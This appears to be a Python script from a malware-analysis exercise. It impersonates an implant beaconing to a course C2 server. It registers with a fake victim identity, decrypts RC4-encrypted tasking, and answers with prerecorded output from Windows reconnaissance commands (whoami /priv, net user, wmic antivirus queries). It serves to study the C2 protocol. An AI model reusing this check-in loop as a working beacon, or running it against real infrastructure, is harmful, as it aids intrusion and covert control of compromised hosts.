#!/usr/bin/python3

import requests
import sys
import time
from rc4_decr import reverse_rc4, format_as_byte_string
from typing import Tuple

log = open('c2_conn.log', 'w')

SERVER = "exam.gradescopech0nky.com"
PORT = 443
USER_AGENT = "1337ch0nky"
GUID = "4F8E09B3-8C22-4C4B-9FC7-2ABD2B10144A"
CHECKIN = '/checkin.php'
NO_ARGS = 'no args'

whoami_priv = ''
with open('exe_command_dumps/whoami_priv_dump.txt', 'r') as f:
    whoami_priv = ''.join(f.readlines())

net_user = ''
with open('exe_command_dumps/net_usr_dump.txt', 'r') as f:
    net_user = ''.join(f.readlines())

ipconfig_all = ''
with open('exe_command_dumps/ipconfig_all_dump.txt', 'r') as f:
    ipconfig_all = ''.join(f.readlines())
    
wmic_ns = ''
with open('exe_command_dumps/wmic_namespace_dump.txt', 'r') as f:
    wmic_ns = ''.join(f.readlines())

wmic_cs = ''
with open('exe_command_dumps/wmic_compsys_dump.txt', 'r') as f:
    wmic_cs = ''.join(f.readlines())
    
# map of hex-cipher-txt commands to ASCII resps
CMD_MAP = {
    '877e34f81832b37ba27d66f93abaf1f66359742df6d2cdceb7073620b7': 'desktop-mi7i96t\\vagrant',
    '877e34f81832b37ba27d66f93abaf1f66359742df6ce81d6f5002b65ea16e2147ec914': whoami_priv,
    '877e34f81832b37ba27d66f93abaf1e87b557a2ef987c986a8083135b51dba4a7bdb534a': ipconfig_all,
    '877e34f81832b37ba27d66f93abaf1ef6e423535ec8bdc9ae4016d37e207ec': net_user,
    '877e34f81832b37ba27d66f93abaf1f6665f7660b080cfcbe21a2d38ea1be82649c2451b7f987ac307c8c83d26f16e030b43026e5bb2555eb7675a8b7e056a811b4f6f816af8473484f2cf56404aa7265a24ce': wmic_ns,
    '877e34f81832b37ba27d66f93abaf1f6665f7660fc81c3d6f21d382bfa07a10e70dd0a3842975d8602c8d6386eeb65560b5c1e22': wmic_cs
}

def c2_connect(c2_post_file: str, c2_post_data_str: str):
    headers = {
        "User-Agent": USER_AGENT,
        "Authorization": GUID,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    url = f"https://{SERVER}:{PORT}{c2_post_file}"
    response = requests.post(url, headers=headers, data=c2_post_data_str)

    if response.status_code == 200:
        log.write(response.text)
        return response.text
    else:
        print(f"[!] request failed with status code {response.status_code}")
        log.close()
        quit()

def connect_til_new_response():
    def parse_ch0nky_cmd(cmd_str: str) -> Tuple[str, str, int]:
        cmd = cmd_str.split('<ch0nky>')[0]
        cmd = cmd.split("bytearray(b'")[1]
        args = cmd_str.split('<ch0nky>')[1]
        arg_num = len(args)
        return cmd, args, arg_num

    def store_cmd(encrypted_cmd: str, resp: str):
        global CMD_MAP
        CMD_MAP[encrypted_cmd] = resp
        
    resp_str = ''
    sleep_for = 60
    while True:
        # send initial checkin
        resp_txt = c2_connect(CHECKIN, resp_str)
        
        assert resp_txt != None
        
        # decrypt resp
        resp_txt = str(reverse_rc4(format_as_byte_string(resp_txt)))
        cmd, args, args_num = parse_ch0nky_cmd(resp_txt)
        
        print(f"[.] got {cmd} {args} ...")
        log.write(f"{cmd} {args}")
        
        if cmd == 'register':
            print(f"[.] received register command, sleeping for {int(args) / 1000} s")
            sleep_for = int(int(args) / 1000)
            resp_str = ""
            
        # check if alr recieved this
        elif CMD_MAP.get(resp_txt) is not None:
            print(f"[.] sending back response to {cmd} {args}")
            resp_str = CMD_MAP.get(resp_txt)
            
        # if not, check if can respond anyway
        elif (cmd == 'execute' or cmd == 'inject') and args_num < 2:
            print(f"[.] received {cmd} without args...")
            resp_str = NO_ARGS
        
        elif cmd == 'inject' or cmd == 'spat':
            print(f"[+] received {cmd.upper()} command!")
            log.write(f"[!] {cmd} {args}") 
            
            # default response for injects & spats
            resp_str = 'OK'
            
            if cmd == 'spat':
                sleep_for = int(60000 / 1000)
        
        else:
            print(f"[!] received new command! please analyze:")
            print(f"{cmd} {args}")
            log.write(f"[!] received new command! please analyze:")
            log.write(f"{cmd} {args}")
            resp_str = ""
        
        store_cmd(resp_txt, resp_str)
        time.sleep(sleep_for)
        sleep_for = 60
            
"""
make_connections(
    some handle,
    user_agent, 
    server_name,
    port_num,
    post_verb,
    reg_php_fn,
    \x01,
    \x01,
    auth_str,
    guid ...? 
)
"""
auth_str = "auth=1337ch0nky&guid=4F8E09B3-8C22-4C4B-9FC7-2ABD2B10144A&user=vagrant&computer=DESKTOP-MI7I96T"
#c2_connect('/register.php', auth_str)

#c2_connect(CHECKIN, "")
""" Response
877e34f81832b37ba27d66f93abaf1f66359742df6d2cdceb7073620b7
'execute<ch0nky>whoami<ch0nky>'
"""
# resp = c2_connect(CHECKIN, net_user)
# print(reverse_rc4(format_as_byte_string(resp)))
# # same response
# #c2_connect_with_retry()

"""
Responses -- running checkin with resp for whoami for long time with no resps
    '877e34f81832b37ba27d66f93abaf1f66359742df6ce81d6f5002b65ea16e2147ec914', 
    '877e34f81832b37ba27d66f93abaf1e87b557a2ef987c986a8083135b51dba4a7bdb534a',
    '877e34f81832b37ba27d66f93abaf1ef6e423535ec8bdc9ae4016d37e207ec',
    '877e34f81832b37ba27d66f93abaf1f6665f7660b080cfcbe21a2d38ea1be82649c2451b7f987ac307c8c83d26f16e030b43026e5bb2555eb7675a8b7e056a811b4f6f816af8473484f2cf56404aa7265a24ce',
    '877e34f81832b37ba27d66f93abaf1f6665f7660fc81c3d6f21d382bfa07a10e70dd0a3842975d8602c8d6386eeb65560b5c1e22',
    '917630ef5125be77af7e2fa96df0f3e263067b2be6d0'
    '906336f21e32b335fd763ea73fa8b6bf38002570afde9e9ae4016d37e207ec'
    

Decrypted responses
    bytearray(b'execute<ch0nky>whoami /priv<ch0nky>')
    bytearray(b'execute<ch0nky>ipconfig /all<ch0nky>')
    bytearray(b'execute<ch0nky>net user<ch0nky>')
    bytearray(b'execute<ch0nky>wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct<ch0nky>')
    bytearray(b'execute<ch0nky>wmic computersystem LIST full<ch0nky>')
    bytearray(b'spat<ch0nky><3<ch0nky>')
"""

print("[+] starting ...")
connect_til_new_response()
log.close()